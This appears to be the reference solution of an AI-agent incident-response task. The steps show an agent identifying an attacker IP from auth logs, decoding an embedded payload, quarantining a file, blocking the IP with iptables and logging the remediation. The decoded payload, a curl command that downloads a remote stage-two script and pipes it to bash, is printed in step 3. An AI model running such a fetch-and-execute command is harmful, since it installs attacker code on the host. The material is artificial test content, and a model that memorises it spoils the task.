description:
1. Agent reads ESCALATION_BRIEF.txt and the auth_anomaly.log to identify 185.220.101.47 as the primary threat actor (most failed logins + successful auth + repeat attempts).
2. Agent uses `python3 /opt/forensics/re-search.py -n ipv4 incident/logs/auth_anomaly.log` to extract IPs, confirming 185.220.101.47 as the dominant attacker.
3. Agent uses `python3 /opt/forensics/base64dump.py incident/logs/auth_anomaly.log` to decode the base64 payload embedded in the POST body log line, revealing 'curl -fsSL http://185.220.101.47/stage2.sh | bash'.
4. Agent follows forensic preservation protocol: runs `sha256sum /tmp/txn_update`, creates `/root/quarantine/` directory, then runs `mv /tmp/txn_update /root/quarantine/txn_update.vir` — critically using the `.vir` extension and moving (not copying) the file.
5. Agent blocks attacker with `iptables -I INPUT 1 -s 185.220.101.47 -j DROP` (INSERT at position 1, not -A append).
6. Agent persists rules using `iptables-save > /etc/iptables/rules.v4` (Debian-specific method per SKILL.md, NOT netfilter-persistent or firewall-cmd).
7. Agent verifies SSH is not disrupted by checking `ss -tulpn | grep ssh`.
8. Agent writes remediation_log.txt containing: UTC timestamp (date -u), each command executed, justification for each action, decoded payload content, sha256 hash of artifact, and observed outcomes — all 6 Change Logging Requirement fields per SKILL.md.
